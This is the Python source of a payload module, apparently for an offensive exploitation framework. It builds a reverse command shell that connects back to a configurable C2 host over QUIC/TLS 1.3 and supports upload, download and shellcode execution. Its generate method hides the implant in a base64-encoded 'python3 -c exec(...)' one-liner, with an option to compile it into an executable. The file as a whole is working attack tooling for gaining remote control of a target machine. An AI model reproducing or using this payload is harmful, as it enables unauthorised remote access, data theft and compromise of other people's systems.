#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.protocols.quic.constants import DEFAULT_QUIC_ALPN
from lib.protocols.quic.implant import build_implant_script


class Module(Payload):

    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Command Shell, Reverse QUIC (via Python)",
        "description": (
            "Connect back over QUIC/TLS 1.3 (ALPN kitty-quic) and expose a command channel "
            "with upload, download, and shellcode support. Requires aioquic on the target."
        ),
        "category": PayloadCategory.CMD,
        "arch": Arch.PYTHON,
        "platform": Platform.MULTI,
        "listener": "listeners/multi/reverse_quic",
        "handler": Handler.REVERSE,
        "session_type": SessionType.QUIC,
        "dependencies": ["aioquic"],
    }

    lhost = OptString("127.0.0.1", "C2 connect-back address", True)
    lport = OptPort(4433, "C2 QUIC port", True)
    alpn = OptString(DEFAULT_QUIC_ALPN, "QUIC ALPN (must match listener)", True)
    upload_dir = OptString(".", "Default directory for uploaded files on target", False, True)
    python_binary = OptString("python3", "Python interpreter on target", True)
    encoder = OptString("", "Encoder", False, True)
    compile_exe = OptBool(False, "Compile to EXE (requires Zig)", False, True)
    output_path = OptString("", "Output path when compile_exe=true", False, True)

    def _build_script(self) -> str:
        return build_implant_script(
            str(self.lhost),
            int(self.lport),
            alpn=str(self.alpn),
            upload_dir=str(self.upload_dir or "."),
        )

    def get_python_script(self):
        return self._build_script()

    def generate(self):
        host = str(self.lhost)
        port = int(self.lport)
        py = str(self.python_binary)
        script = self._build_script()

        if self.compile_exe:
            import os

            out = (self.output_path or "").strip()
            if not out:
                out = os.path.join("output", f"quic_payload_{host}_{port}")
            out = os.path.abspath(out)
            if self.compile_python_to_exe(output_path=out, target_platform="linux"):
                return out
            from core.output_handler import print_warning

            print_warning("EXE compilation failed, falling back to Python command")

        import base64

        encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
        return (
            f"{py} -c \"import base64;exec(base64.b64decode('{encoded}').decode())\""
        )
